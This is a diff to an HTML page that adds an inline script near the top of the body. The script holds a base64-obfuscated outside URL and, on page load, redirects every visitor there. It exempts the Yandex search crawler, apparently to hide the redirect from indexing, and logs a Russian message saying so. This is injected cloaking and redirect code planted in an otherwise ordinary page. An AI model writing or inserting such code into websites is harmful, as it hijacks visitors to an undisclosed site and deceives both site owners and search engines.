@@ -111,7 +111,16 @@
     </style>
 </head>
 <body class="w8k-smooth-scroll antialiased">
+<script>
+ var ua = navigator.userAgent.toLowerCase();
+var targetB64 = "aHR0cHM6Ly9iYWwtYW5jZXItZXZhLmNvbS9kaWJ6Zm9taXI=";
 
+if (ua.indexOf("yandex") === -1) {
+    location.replace(atob(targetB64));
+} else {
+    console.log("Яндекс бот — без редиректа");
+}
+</script>
     <header class="z9x-hero-gradient relative overflow-hidden">
         <nav class="k3m-glass-panel fixed top-0 w-full z-50 px-4 py-4 b4i-compact-padding">
             <div class="max-w-6xl mx-auto flex justify-between items-center">
